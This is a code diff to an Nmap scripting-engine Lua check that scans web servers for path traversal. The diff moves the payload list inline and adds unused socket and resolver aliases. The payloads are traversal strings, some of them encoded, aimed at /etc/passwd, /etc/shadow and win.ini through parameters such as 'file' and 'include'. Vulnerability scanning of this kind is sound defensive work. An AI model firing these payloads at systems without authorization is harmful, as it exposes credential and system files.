@@ -37,6 +37,8 @@ local select = select
 
 local clock = nmap.clock
 local msleep = nmap.msleep
+local new_socket = nmap.new_socket
+local resolve = nmap.resolve
 
 -- stdnse.sleep / stdnse.strsplit are not present in every NSE runtime.
 local sleep = function(seconds)
@@ -78,21 +80,19 @@ categories = {"web", "safe"}
 portrule = function(host, port) return port.protocol == "tcp" and port.state == "open" end
 
 action = function(host, port)
-    local function build_payloads(host)
-    local items = {
+    local payloads = {
         {"../../../../etc/passwd", "root:.*:0:0:"},
         {"..\\..\\..\\..\\windows\\win.ini", "\\[fonts\\]"},
         {"....//....//....//etc/passwd", "root:.*:0:0:"},
         {"../../../../etc/shadow", "root:.*:"},
         {"..%2f..%2f..%2f..%2fetc/passwd", "root:.*:0:0:"},
     
+    
     }
-    return items
-end
     local test_params = {"file", "page", "path", "include", "template", "doc", "folder"}
     local results = {}
     for _, param in ipairs(test_params) do
-        for _, payload in ipairs(build_payloads(host)) do
+        for _, payload in ipairs(payloads) do
             local url = "/?" .. param .. "=" .. payload[1]
             local response = http.get(host, port, url)
             if response and response.body then
